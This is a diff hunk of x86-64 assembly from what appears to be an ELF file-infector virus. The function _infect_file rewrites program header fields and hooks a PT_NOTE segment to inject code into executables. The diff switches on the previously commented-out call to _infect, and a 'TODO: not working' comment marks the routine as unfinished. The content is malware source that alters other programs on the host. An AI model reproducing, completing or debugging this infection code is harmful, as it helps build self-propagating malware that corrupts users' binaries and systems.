@@ -856,14 +856,22 @@ _infect_file: ; (string rdi, stat rsi)
 
 			mov [rbx + P_VADDR], rax
 			mov [rbx + P_PADDR], rax
-			mov [rbx + P_FILESZ], r14
-			mov [rbx + P_MEMSZ], r14
+;			mov [rbx + P_FILESZ], r14
+;			mov [rbx + P_MEMSZ], r14
 			mov qword[rbx + P_ALIGN], 0x1000
-;			push r11
-;			push 1
-;			pop r11; mode PT_NOTE
-;			call _infect
-;	 		pop r11
+
+			push r11
+
+			mov rdi, [rbx + P_OFFSET]
+			; TODO: not working
+			add rdi, r13 ; addr pointer -> mmap
+
+			mov rdx, r14
+
+			push 1
+			pop r11; mode PT_NOTE
+			call _infect
+	 		pop r11
 
 			; write file
 			mov rdi, r11
